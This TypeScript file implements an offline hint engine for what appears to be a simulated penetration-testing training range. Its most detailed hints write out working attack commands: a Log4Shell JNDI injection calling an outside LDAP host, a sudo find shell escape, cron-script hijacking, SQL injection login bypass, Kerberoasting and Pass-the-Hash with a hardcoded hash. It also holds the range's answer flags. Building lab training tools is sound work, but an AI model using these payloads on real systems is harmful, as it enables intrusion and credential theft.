import { AiResponse, HintLevel, MentorHint } from '../../types/ghostops';
import { TargetMachine } from '../../types';
import { EvidenceItem } from '../../simulation/types';

export interface HintContext {
  machine: TargetMachine;
  evidence: EvidenceItem[];
  portsDiscovered: number[];
  routesDiscovered: string[];
  compromiseLevel: 'NONE' | 'RECON' | 'USER' | 'ROOT';
  userClaimed: boolean;
  rootClaimed: boolean;
}

export interface IGhostOpsProvider {
  type: string;
  generateHint(context: HintContext, level: HintLevel): Promise<MentorHint>;
  queryAssistant(prompt: string, context?: HintContext): Promise<AiResponse>;
}

export class OfflineDeterministicProvider implements IGhostOpsProvider {
  public type = 'offline';

  public async generateHint(ctx: HintContext, level: HintLevel): Promise<MentorHint> {
    const { machine, evidence, compromiseLevel, userClaimed, rootClaimed } = ctx;
    const currentPhase = rootClaimed || compromiseLevel === 'ROOT'
      ? 'ROOTED'
      : userClaimed || compromiseLevel === 'USER'
      ? 'PRIVESC'
      : compromiseLevel === 'RECON'
      ? 'FOOTHOLD'
      : 'RECON';

    const hints = this.getMachineHints(machine.id, currentPhase);
    const chosenHint = hints[level] || hints[1];

    const relevantEv = evidence
      .filter((e) => e.machineId === machine.id)
      .map((e) => `${e.name}: ${e.value.slice(0, 45)}`);

    return {
      level,
      levelTitle: this.getLevelTitle(level),
      machineId: machine.id,
      machineName: machine.name,
      currentPhase,
      content: chosenHint.text,
      relevantEvidence: relevantEv.length > 0 ? relevantEv : ['No machine-specific evidence logged in Loot Vault yet.'],
      suggestedAction: chosenHint.action,
    };
  }

  public async queryAssistant(prompt: string, context?: HintContext): Promise<AiResponse> {
    const targetName = context?.machine.name || 'target system';
    return {
      success: true,
      provider: 'offline',
      modelUsed: 'deterministic-rules-engine-v1',
      text: `[Offline Socratic Engine] Regarding "${prompt.slice(0, 50)}..." on ${targetName}: Analyze active ports, review discovered loot tokens in the inventory, and test input fields for injection boundaries.`,
    };
  }

  private getLevelTitle(level: HintLevel): string {
    switch (level) {
      case 1:
        return 'Level 1: General Direction';
      case 2:
        return 'Level 2: Relevant Service & Category';
      case 3:
        return 'Level 3: Specific Evidence Inspection';
      case 4:
        return 'Level 4: Explicit Next Step';
      case 5:
      default:
        return 'Level 5: Full Step-by-Step Walkthrough';
    }
  }

  private getMachineHints(
    machineId: string,
    phase: 'RECON' | 'FOOTHOLD' | 'PRIVESC' | 'ROOTED'
  ): Record<HintLevel, { text: string; action?: string }> {
    if (machineId === 'ecorp-hr') {
      if (phase === 'ROOTED') {
        return {
          1: { text: 'Target is already fully rooted (UID 0). Review remediation notes or move to IronBank Vault.', action: 'Inspect remediation advice' },
          2: { text: 'Both User and Root flags have been successfully captured on E-Corp HR.', action: 'Target next machine: 10.10.11.82' },
          3: { text: 'You captured ROOTRANGE{u53r_l0g4j_f00th0ld_pwn3d} and ROOTRANGE{r00t_pr1v3sc_m4st3r_c0mpr0m1s3}.' },
          4: { text: 'Proceed to pivot to the internal network router (10.10.12.1) and target IronBank (10.10.11.82).' },
          5: { text: 'Completed. Pivot unlocked in BloodHound Attack Graph.' },
        };
      }
      if (phase === 'PRIVESC') {
        return {
          1: { text: 'You have a user foothold. Examine standard Linux local enumeration commands for privileged binaries.' },
          2: { text: 'Look into sudo configuration or setuid binaries on the Linux system.' },
          3: { text: 'Inspect /etc/sudoers.d/alex or run "sudo -l" to see what commands can be executed with elevated privileges.' },
          4: { text: 'Notice that /usr/bin/find can be executed with NOPASSWD as root. Check GTFOBins for find -exec.' },
          5: { text: 'Run: sudo /usr/bin/find . -exec /bin/sh \\; -quit. Then read /root/root.txt to extract the Root Flag.', action: 'sudo /usr/bin/find . -exec /bin/sh \\; -quit' },
        };
      }
      // RECON or FOOTHOLD
      return {
        1: { text: 'Begin by scanning the perimeter DMZ IP 10.10.11.45 to find open web applications and services.' },
        2: { text: 'Inspect the HTTP service on port 80 and the application running on port 8080. Look for Java Log4j logging frameworks.' },
        3: { text: 'Review Log4jAuditLogger.java or the server headers in the HTTP Repeater. Apache HTTP and Log4j 2.14.1 are present.' },
        4: { text: 'The /api/audit endpoint logs incoming User-Agent and X-Forwarded-For headers without input sanitization.' },
        5: { text: 'Inject ${jndi:ldap://10.10.14.22:1389/Exploit} into the User-Agent header of a POST to /api/audit in the HTTP Repeater, or read /home/alex/user.txt for the user flag.', action: 'curl -H "User-Agent: \${jndi:ldap://10.10.14.22:1389/Exploit}" http://10.10.11.45/api/audit' },
      };
    }

    if (machineId === 'iron-vault') {
      if (phase === 'ROOTED') {
        return {
          1: { text: 'IronBank Vault has been completely conquered. Move to Active Directory Corp-DC01.', action: 'Select Corp-DC01' },
          2: { text: 'Both MySQL SQLi and Cronjob hijack were verified.' },
          3: { text: 'User and Root flags were captured for IronBank Vault.' },
          4: { text: 'Select Corp-DC01 (10.10.11.99) in the Target Selector.' },
          5: { text: 'Proceed to Corp-DC01 Kerberoasting.' },
        };
      }
      if (phase === 'PRIVESC') {
        return {
          1: { text: 'You possess user-level financial ledger access. Look for automated root background tasks or scheduled scripts.' },
          2: { text: 'Investigate cron configurations in /etc/cron.d or /etc/crontab on Debian.' },
          3: { text: 'The vault-backup job executes /opt/ironbank/scripts/backup.sh every 60 seconds as root.' },
          4: { text: 'Check the file permissions on /opt/ironbank/scripts/backup.sh. Is it writable by the node_app / finance group?' },
          5: { text: 'Append a reverse shell or read command to /opt/ironbank/scripts/backup.sh: echo "cat /root/root.txt > /tmp/root.txt" >> /opt/ironbank/scripts/backup.sh, then wait 60 seconds.', action: 'echo "cat /root/root.txt > /tmp/root.txt" >> /opt/ironbank/scripts/backup.sh' },
        };
      }
      // RECON or FOOTHOLD
      return {
        1: { text: 'Enumerate the internal financial API running on 10.10.11.82:8080.' },
        2: { text: 'Focus on /api/login and test whether the username parameter allows SQL injection auth bypass.' },
        3: { text: 'Inspect the JSON authentication request. The backend concatenates raw user input into MySQL query strings.' },
        4: { text: 'Send POST /api/login with {"username":"admin\' OR 1=1--","password":"x"} to bypass authentication and receive a JWT token.' },
        5: { text: 'Take the received JWT token, notice alg: none or forged finance_admin role, and submit GET /api/vault with Authorization header or Cookie auth_token to read user_flag.', action: 'POST /api/login {"username":"admin\' OR 1=1--","password":"x"}' },
      };
    }

    if (machineId === 'corp-dc01') {
      if (phase === 'ROOTED') {
        return {
          1: { text: 'Active Directory Domain Forest fully compromised. You have achieved Domain Admin status.', action: 'Review Range Master flag' },
          2: { text: 'DCSync and Pass-the-Hash SYSTEM execution verified.' },
          3: { text: 'Root flag captured on Domain Controller.' },
          4: { text: 'Claim the final Range Master trophy flag.' },
          5: { text: 'Congratulations on completing ROOTRANGE.' },
        };
      }
      if (phase === 'PRIVESC') {
        return {
          1: { text: 'You have cracked the MSSQL service account. Escalate to Domain Admin using Active Directory credential extraction.' },
          2: { text: 'Examine domain privileges for sql_svc. Does it possess SeBackupPrivilege or DCSync replication rights?' },
          3: { text: 'Run secretsdump.py or inspect domain replication edges for Administrator NTLM hashes.' },
          4: { text: 'Extract the Administrator NTLM hash (aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42).' },
          5: { text: 'Execute Pass-the-Hash with psexec.py: psexec.py -hashes :e19ccf75ee54e06b06a5907af13cef42 Administrator@10.10.11.99 to capture root flag.', action: 'psexec.py -hashes :e19ccf75ee54e06b06a5907af13cef42 Administrator@10.10.11.99' },
        };
      }
      // RECON or FOOTHOLD
      return {
        1: { text: 'Discover Active Directory services running on 10.10.11.99: Kerberos (88), LDAP (389), SMB (445).' },
        2: { text: 'Focus on Kerberoasting via port 88 Kerberos Ticket Granting Service (TGS).' },
        3: { text: 'Query SPN records using GetUserSPNs.py to extract service tickets for MSSQLSvc.' },
        4: { text: 'Run GetUserSPNs.py omnicorp.local/ -request, save the hash, and crack it using john with rockyou.txt.' },
        5: { text: 'Execute john --wordlist=rockyou.txt mssql_tgs.hash. The recovered plaintext password reveals user flag ROOTRANGE{u53r_k3rb3r04st_t1ck3t_h4sh}.', action: 'GetUserSPNs.py omnicorp.local/ -request' },
      };
    }

    return {
      1: { text: 'Scan target for open services.' },
      2: { text: 'Enumerate open ports and web routes.' },
      3: { text: 'Check Loot Vault for credentials.' },
      4: { text: 'Verify exploit prerequisites.' },
      5: { text: 'Execute exploit and claim flag.' },
    };
  }
}
